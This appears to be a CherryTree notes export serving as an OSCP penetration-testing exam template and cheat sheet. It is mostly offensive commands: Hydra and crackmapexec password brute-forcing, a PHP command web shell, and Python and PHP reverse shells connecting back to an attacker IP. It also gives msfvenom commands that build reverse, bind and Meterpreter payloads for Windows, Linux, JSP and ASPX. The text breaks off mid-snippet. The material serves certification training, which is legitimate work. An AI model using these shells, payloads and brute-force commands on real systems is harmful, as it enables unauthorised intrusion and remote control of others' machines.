QIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAA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</encoded_png>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1707168017">
        <rich_text>
Linux Proof: </rich_text>
        <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
        <rich_text>
Windows Proof: </rich_text>
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
        <rich_text>


User:








root:




</rich_text>
        <encoded_png char_offset="179" justification="left" link=""></encoded_png>
        <codebox char_offset="194" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat /root/root.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</codebox>
        <encoded_png char_offset="197" justification="left" link=""></encoded_png>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1706989762">
      <rich_text>
☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 103">DNS</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 42">PrivEsc</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 106">SNMP</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.10.84 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 10.10.10.84 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.84 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.10.10.84:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

___________________________________</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>____


SSH



or if that d</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>oesnt work

</rich_text>
          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.84</codebox>
          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.84 -u patrick -p /usr/share/wordlists/rockyou.txt
</codebox>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1701626719">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
